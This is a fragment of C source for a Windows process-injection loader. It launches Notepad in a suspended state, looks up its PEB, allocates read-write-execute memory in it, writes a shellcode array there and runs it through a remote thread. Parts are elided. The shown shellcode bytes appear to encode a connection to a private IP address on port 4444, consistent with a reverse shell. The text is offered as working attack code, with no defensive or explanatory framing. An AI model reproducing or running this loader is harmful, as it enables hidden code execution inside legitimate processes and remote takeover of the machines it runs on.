...
unsigned char shellcode[] = 
    ...
    "\x00\x49\x89\xe5\x49\xbc\x02\x00\x11\x5c\x0a\x00\x02\x08"
...
int main() {
    ...
    // Step 1: Create Notepad in Suspended Mode
    if (!CreateProcessA("C:\\Windows\\System32\\notepad.exe",
                        NULL, &sa, &sa, FALSE, CREATE_SUSPENDED,
                        NULL, NULL, &si, &pi)) {
        printf("Failed to create process! Error: %lu\n", GetLastError());
        return 1;
    }
    printf("[1] Process created successfully! PID: %lu\n", (unsigned long)pi.dwProcessId);

    // Step 2: Load ntdll.dll dynamically
    ...
    if (!NtQueryInformationProcess) {
        printf("Failed to get NtQueryInformationProcess address! Error: %lu\n", GetLastError());
        FreeLibrary(hNtdll);
        return 1;
    }

    // Step 3: Get the PEB Address using the predefined structure
    ...
    printf("[2] PEB Base Address: 0x%p\n", pbi.PebBaseAddress);

    // Step 4: Allocate Memory in the Target Process
    LPVOID remoteMemory = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode),
                                         MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMemory) {
        printf("Memory allocation failed! Error: %lu\n", GetLastError());
        return 1;
    }
    printf("[3] Allocated memory at 0x%p\n", remoteMemory);
    ...
    printf("[4] Shellcode written to memory\n");
    ...
    printf("[5] Remote thread created! Code executed!\n");

    // Step 7: Resume Notepad
